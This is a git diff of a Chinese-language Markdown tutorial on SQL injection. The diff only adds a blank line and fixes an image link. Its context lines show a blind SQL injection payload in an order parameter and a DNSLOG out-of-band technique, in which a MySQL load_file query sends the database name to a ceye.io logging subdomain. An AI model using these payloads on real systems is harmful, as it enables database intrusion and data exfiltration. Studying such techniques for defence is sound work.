@@ -218,6 +218,7 @@ http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) 
 ### DNSLOG注入
 
 **DNS在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。**
+
 dnslog平台：[http://ceye.io/](http://ceye.io/)
 
 ```
@@ -240,7 +241,7 @@ mysql> select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'));
 +----------------------------------------------------------------------+
 1 row in set (0.00 sec)
 ```
-[![图片.png](https://upload-images.jianshu.io/upload_images/9113969-acd35de9c423b8a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
+![图片.png](https://upload-images.jianshu.io/upload_images/9113969-acd35de9c423b8a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
 
 ## 参考资料
 
